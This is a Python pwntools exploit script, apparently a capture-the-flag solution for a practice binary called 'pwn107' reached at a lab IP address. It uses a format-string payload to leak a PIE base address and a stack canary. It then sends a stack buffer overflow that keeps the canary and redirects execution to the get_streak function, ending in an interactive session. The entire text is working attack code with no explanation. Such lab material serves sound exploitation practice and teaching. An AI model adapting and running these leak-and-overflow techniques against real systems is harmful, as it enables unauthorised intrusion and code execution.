#!/usr/bin/env python3
from pwn import *

binary = context.binary = ELF("./pwn107.pwn107")

p = remote("10.10.69.120", 9007)
#p = process(binary.path)

payload = b""
payload += b"%11$p %13$p"

p.sendlineafter(b"What's your last streak? ", payload)

p.recvuntil(b"Your current streak: ")
result = [int(x,16) for x in p.recvline().split()]

log.success(f"result :{result}")

dynamic_base = result[0] - 0x780
canary = result[1]

log.success(f"dynamic_base :{hex(dynamic_base)}")
log.success(f"canary :{hex(canary)}")

payload = b""
payload += 0x18 * b"A"
payload += p64(canary)
payload += 0x8 * b"A"
get_streak = binary.sym.get_streak + dynamic_base
payload += p64(get_streak)

log.success(f"get_streak :{hex(get_streak)}")
print(payload)

p.clean()
p.sendline(payload)

p.interactive()
